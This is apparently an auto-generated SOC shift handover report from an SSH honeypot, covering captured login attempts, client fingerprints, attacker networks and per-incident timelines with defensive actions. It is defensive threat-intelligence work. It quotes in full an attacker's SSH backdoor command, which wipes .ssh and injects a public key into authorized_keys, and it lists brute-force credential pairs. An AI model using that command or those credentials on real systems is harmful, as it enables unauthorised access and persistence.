# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-10 |
| **Generated At** | 2026-08-10T11:12:29Z |
| **Shift Time** | 11:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **191** |
| Confirmed Threats | **159** |
| False Positives Filtered | **32** (16.8%) |
| Unique Attacker IPs | **78** |
| Countries of Origin | **26** |
| High Severity Cases | **41** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **150** |
| Malware Samples Analyzed | **3** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **50** |
| Unique Credential Pairs | **23** |
| Unique Usernames | **12** |
| Unique Passwords | **22** |
| Successful Auth Pairs | **41** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `support` | 9 |
| `emcali` | 3 |
| `system` | 2 |
| `administrator` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `LeitboGi0ro` | 6 |
| `smo@@kkklss` | 6 |
| `support` | 4 |
| `123@@@` | 4 |
| `emcali` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `LeitboGi0ro` | 6 |
| `root` | `smo@@kkklss` | 6 |
| `support` | `support` | 4 |
| `root` | `123@@@` | 4 |
| `emcali` | `emcali` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `176.53.159.196` | 2026-08-10T08:55:30 |
| `support` | `Support12` | `27.223.98.117` | 2026-08-10T08:59:09 |
| `support` | `Support12` | `103.174.145.35` | 2026-08-10T08:59:17 |
| `system` | `OkwKcECs8qJP2Z` | `111.70.14.135` | 2026-08-10T09:03:32 |
| `system` | `OkwKcECs8qJP2Z` | `186.239.41.74` | 2026-08-10T09:03:40 |
| `emcali` | `emcali` | `14.23.77.27` | 2026-08-10T09:08:53 |
| `administrator` | `administrator` | `10.0.0.73` | 2026-08-10T09:10:10 |
| `test` | `2222` | `10.0.0.73` | 2026-08-10T09:14:25 |
| `emcali` | `emcali` | `10.0.0.73` | 2026-08-10T09:20:40 |
| `administrator` | `administrator` | `182.52.72.189` | 2026-08-10T09:27:57 |
| `root` | `admin` | `164.92.109.155` | 2026-08-10T09:31:05 |
| `test` | `2222` | `59.48.39.222` | 2026-08-10T09:33:13 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-10T09:34:40 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-10T09:34:41 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-10T09:34:44 |
| `emcali` | `emcali` | `41.214.10.178` | 2026-08-10T09:37:53 |
| `root` | `Huawei@123` | `35.130.111.98` | 2026-08-10T09:42:59 |
| `blank` | `admin` | `122.160.187.31` | 2026-08-10T09:45:59 |
| `root` | `123@@@` | `140.245.50.204` | 2026-08-10T09:53:58 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-08-10T09:53:58 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-08-10T09:54:02 |
| `root` | `Huawei@123` | `10.0.0.73` | 2026-08-10T09:54:46 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-10T10:02:00 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-10T10:02:00 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-10T10:02:10 |
| `support` | `support` | `10.0.0.73` | 2026-08-10T10:02:11 |
| `admin` | `adminuser` | `124.88.174.143` | 2026-08-10T10:07:31 |
| `admin` | `admin2001` | `10.0.0.73` | 2026-08-10T10:23:09 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `45.79.181.251` | 2026-08-10T10:25:11 |
| `debian` | `debian88` | `122.160.59.87` | 2026-08-10T10:36:43 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-08-10T10:36:52 |
| `root` | `123@@@` | `146.56.164.20` | 2026-08-10T10:36:54 |
| `root` | `kevin123` | `154.83.15.101` | 2026-08-10T10:42:30 |
| `345gs5662d34` | `345gs5662d34` | `154.83.15.101` | 2026-08-10T10:42:33 |
| `root` | `3245gs5662d34` | `154.83.15.101` | 2026-08-10T10:42:35 |
| `root` | `qazwsx12.` | `213.176.16.218` | 2026-08-10T10:49:05 |
| `345gs5662d34` | `345gs5662d34` | `213.176.16.218` | 2026-08-10T10:49:07 |
| `root` | `3245gs5662d34` | `213.176.16.218` | 2026-08-10T10:49:08 |
| `centos` | `centos1234567890` | `36.93.154.207` | 2026-08-10T10:51:47 |
| `support` | `default` | `10.0.0.73` | 2026-08-10T10:53:20 |
| `support` | `default` | `182.156.80.11` | 2026-08-10T10:54:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **191** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Paramiko (Python) | 16 |
| OpenSSH | 15 |
| libssh | 14 |
| Go SSH scanner | 5 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 15 | 15 |
| `a2de0f306611...` | Mirai/variant | 12 | 3 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 15 | 15 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 12 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 4 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `44ac1859818d...` | libssh | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `213.176.16.218`, `154.83.15.101`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **78** |
| Unique ASNs | **55** |
| High-Risk ASNs | **37** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS6849` | JSC Ukrtelecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (41)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ba4811460610

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-10 08:55 |
| **Last Seen** | 2026-08-10 08:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 08:55:29` | `cowrie.session.connect` |
| `2026-08-10 08:55:29` | `cowrie.client.version` |
| `2026-08-10 08:55:30` | `cowrie.client.kex` |
| `2026-08-10 08:55:30` | `cowrie.login.success` |
| `2026-08-10 08:55:30` | `cowrie.direct-tcpip.request` |
| `2026-08-10 08:55:30` | `cowrie.direct-tcpip.data` |
| `2026-08-10 08:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f4f670c28f1

| Field | Detail |
|---|---|
| **Source IP** | `27.223.98[.]117` |
| **First Seen** | 2026-08-10 08:59 |
| **Last Seen** | 2026-08-10 08:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 08:59:06` | `cowrie.session.connect` |
| `2026-08-10 08:59:07` | `cowrie.client.version` |
| `2026-08-10 08:59:07` | `cowrie.client.kex` |
| `2026-08-10 08:59:09` | `cowrie.login.success` |
| `2026-08-10 08:59:10` | `cowrie.direct-tcpip.request` |
| `2026-08-10 08:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.223.98[.]117` to AbuseIPDB if not already reported
- [ ] Block `27.223.98[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65f6f1f3038d

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-10 08:59 |
| **Last Seen** | 2026-08-10 08:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 08:59:15` | `cowrie.session.connect` |
| `2026-08-10 08:59:15` | `cowrie.client.version` |
| `2026-08-10 08:59:15` | `cowrie.client.kex` |
| `2026-08-10 08:59:17` | `cowrie.login.success` |
| `2026-08-10 08:59:17` | `cowrie.direct-tcpip.request` |
| `2026-08-10 08:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa750c4cbbf7

| Field | Detail |
|---|---|
| **Source IP** | `111.70.14[.]135` |
| **First Seen** | 2026-08-10 09:03 |
| **Last Seen** | 2026-08-10 09:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:03:29` | `cowrie.session.connect` |
| `2026-08-10 09:03:30` | `cowrie.client.version` |
| `2026-08-10 09:03:30` | `cowrie.client.kex` |
| `2026-08-10 09:03:32` | `cowrie.login.success` |
| `2026-08-10 09:03:33` | `cowrie.direct-tcpip.request` |
| `2026-08-10 09:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.14[.]135` to AbuseIPDB if not already reported
- [ ] Block `111.70.14[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0a12837acac

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-08-10 09:03 |
| **Last Seen** | 2026-08-10 09:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:03:38` | `cowrie.session.connect` |
| `2026-08-10 09:03:38` | `cowrie.client.version` |
| `2026-08-10 09:03:38` | `cowrie.client.kex` |
| `2026-08-10 09:03:40` | `cowrie.login.success` |
| `2026-08-10 09:03:41` | `cowrie.direct-tcpip.request` |
| `2026-08-10 09:03:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28e384371bba

| Field | Detail |
|---|---|
| **Source IP** | `14.23.77[.]27` |
| **First Seen** | 2026-08-10 09:08 |
| **Last Seen** | 2026-08-10 09:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:08:50` | `cowrie.session.connect` |
| `2026-08-10 09:08:51` | `cowrie.client.version` |
| `2026-08-10 09:08:51` | `cowrie.client.kex` |
| `2026-08-10 09:08:53` | `cowrie.login.success` |
| `2026-08-10 09:08:53` | `cowrie.direct-tcpip.request` |
| `2026-08-10 09:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.23.77[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.23.77[.]27` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb348b48f9f

| Field | Detail |
|---|---|
| **Source IP** | `182.52.72[.]189` |
| **First Seen** | 2026-08-10 09:27 |
| **Last Seen** | 2026-08-10 09:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:27:54` | `cowrie.session.connect` |
| `2026-08-10 09:27:55` | `cowrie.client.version` |
| `2026-08-10 09:27:55` | `cowrie.client.kex` |
| `2026-08-10 09:27:57` | `cowrie.login.success` |
| `2026-08-10 09:27:58` | `cowrie.direct-tcpip.request` |
| `2026-08-10 09:28:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.72[.]189` to AbuseIPDB if not already reported
- [ ] Block `182.52.72[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82dc01fdcc28

| Field | Detail |
|---|---|
| **Source IP** | `164.92.109[.]155` |
| **First Seen** | 2026-08-10 09:31 |
| **Last Seen** | 2026-08-10 09:31 |
| **Session Duration** | 25s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:31:03` | `cowrie.session.connect` |
| `2026-08-10 09:31:03` | `cowrie.client.version` |
| `2026-08-10 09:31:03` | `cowrie.client.kex` |
| `2026-08-10 09:31:04` | `cowrie.login.failed` |
| `2026-08-10 09:31:05` | `cowrie.login.success` |
| `2026-08-10 09:31:06` | `cowrie.session.params` |
| `2026-08-10 09:31:06` | `cowrie.command.input` |
| `2026-08-10 09:31:06` | `cowrie.command.failed` |
| `2026-08-10 09:31:06` | `cowrie.log.closed` |
| `2026-08-10 09:31:06` | `cowrie.session.params` |
| `2026-08-10 09:31:06` | `cowrie.command.input` |
| `2026-08-10 09:31:06` | `cowrie.log.closed` |
| `2026-08-10 09:31:07` | `cowrie.session.params` |
| `2026-08-10 09:31:07` | `cowrie.command.input` |
| `2026-08-10 09:31:07` | `cowrie.log.closed` |
| `2026-08-10 09:31:08` | `cowrie.session.params` |
| `2026-08-10 09:31:08` | `cowrie.command.input` |
| `2026-08-10 09:31:08` | `cowrie.log.closed` |
| `2026-08-10 09:31:09` | `cowrie.session.params` |
| `2026-08-10 09:31:09` | `cowrie.command.input` |
| `2026-08-10 09:31:09` | `cowrie.log.closed` |
| `2026-08-10 09:31:10` | `cowrie.session.params` |
| `2026-08-10 09:31:10` | `cowrie.command.input` |
| `2026-08-10 09:31:10` | `cowrie.log.closed` |
| `2026-08-10 09:31:10` | `cowrie.session.params` |
| `2026-08-10 09:31:10` | `cowrie.command.input` |
| `2026-08-10 09:31:11` | `cowrie.log.closed` |
| `2026-08-10 09:31:11` | `cowrie.session.params` |
| `2026-08-10 09:31:11` | `cowrie.command.input` |
| `2026-08-10 09:31:12` | `cowrie.log.closed` |
| `2026-08-10 09:31:12` | `cowrie.session.params` |
| `2026-08-10 09:31:12` | `cowrie.command.input` |
| `2026-08-10 09:31:12` | `cowrie.log.closed` |
| `2026-08-10 09:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.109[.]155` to AbuseIPDB if not already reported
- [ ] Block `164.92.109[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c81bc063bbc

| Field | Detail |
|---|---|
| **Source IP** | `59.48.39[.]222` |
| **First Seen** | 2026-08-10 09:33 |
| **Last Seen** | 2026-08-10 09:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:33:08` | `cowrie.session.connect` |
| `2026-08-10 09:33:09` | `cowrie.client.version` |
| `2026-08-10 09:33:09` | `cowrie.client.kex` |
| `2026-08-10 09:33:13` | `cowrie.login.success` |
| `2026-08-10 09:33:14` | `cowrie.direct-tcpip.request` |
| `2026-08-10 09:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.48.39[.]222` to AbuseIPDB if not already reported
- [ ] Block `59.48.39[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0c0626a848a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 09:34 |
| **Last Seen** | 2026-08-10 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:34:40` | `cowrie.session.connect` |
| `2026-08-10 09:34:40` | `cowrie.client.version` |
| `2026-08-10 09:34:40` | `cowrie.client.kex` |
| `2026-08-10 09:34:40` | `cowrie.login.success` |
| `2026-08-10 09:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b701d46bf56

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 09:34 |
| **Last Seen** | 2026-08-10 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:34:41` | `cowrie.session.connect` |
| `2026-08-10 09:34:41` | `cowrie.client.version` |
| `2026-08-10 09:34:41` | `cowrie.client.kex` |
| `2026-08-10 09:34:41` | `cowrie.login.success` |
| `2026-08-10 09:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e53c884ad4b9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 09:34 |
| **Last Seen** | 2026-08-10 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:34:44` | `cowrie.session.connect` |
| `2026-08-10 09:34:44` | `cowrie.client.version` |
| `2026-08-10 09:34:44` | `cowrie.client.kex` |
| `2026-08-10 09:34:44` | `cowrie.login.success` |
| `2026-08-10 09:34:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f85f90bf9aa

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 09:34 |
| **Last Seen** | 2026-08-10 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:34:44` | `cowrie.session.connect` |
| `2026-08-10 09:34:44` | `cowrie.client.version` |
| `2026-08-10 09:34:44` | `cowrie.client.kex` |
| `2026-08-10 09:34:45` | `cowrie.login.success` |
| `2026-08-10 09:34:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d232d2a80f4b

| Field | Detail |
|---|---|
| **Source IP** | `41.214.10[.]178` |
| **First Seen** | 2026-08-10 09:37 |
| **Last Seen** | 2026-08-10 09:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:37:51` | `cowrie.session.connect` |
| `2026-08-10 09:37:52` | `cowrie.client.version` |
| `2026-08-10 09:37:52` | `cowrie.client.kex` |
| `2026-08-10 09:37:53` | `cowrie.login.success` |
| `2026-08-10 09:37:53` | `cowrie.direct-tcpip.request` |
| `2026-08-10 09:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.214.10[.]178` to AbuseIPDB if not already reported
- [ ] Block `41.214.10[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7ef56ee7cf7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-10 09:38 |
| **Last Seen** | 2026-08-10 09:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:38:25` | `cowrie.session.connect` |
| `2026-08-10 09:38:25` | `cowrie.client.version` |
| `2026-08-10 09:38:25` | `cowrie.client.kex` |
| `2026-08-10 09:38:26` | `cowrie.login.success` |
| `2026-08-10 09:38:26` | `cowrie.direct-tcpip.request` |
| `2026-08-10 09:38:26` | `cowrie.direct-tcpip.data` |
| `2026-08-10 09:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-548db39789fc

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]98` |
| **First Seen** | 2026-08-10 09:42 |
| **Last Seen** | 2026-08-10 09:47 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:42:58` | `cowrie.session.connect` |
| `2026-08-10 09:42:58` | `cowrie.client.version` |
| `2026-08-10 09:42:58` | `cowrie.client.kex` |
| `2026-08-10 09:42:59` | `cowrie.login.success` |
| `2026-08-10 09:42:59` | `cowrie.direct-tcpip.request` |
| `2026-08-10 09:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]98` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0565448db799

| Field | Detail |
|---|---|
| **Source IP** | `122.160.187[.]31` |
| **First Seen** | 2026-08-10 09:45 |
| **Last Seen** | 2026-08-10 09:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:45:56` | `cowrie.session.connect` |
| `2026-08-10 09:45:57` | `cowrie.client.version` |
| `2026-08-10 09:45:57` | `cowrie.client.kex` |
| `2026-08-10 09:45:59` | `cowrie.login.success` |
| `2026-08-10 09:45:59` | `cowrie.direct-tcpip.request` |
| `2026-08-10 09:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.187[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.187[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa4ee87f04d

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 09:53 |
| **Last Seen** | 2026-08-10 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:53:57` | `cowrie.session.connect` |
| `2026-08-10 09:53:57` | `cowrie.client.version` |
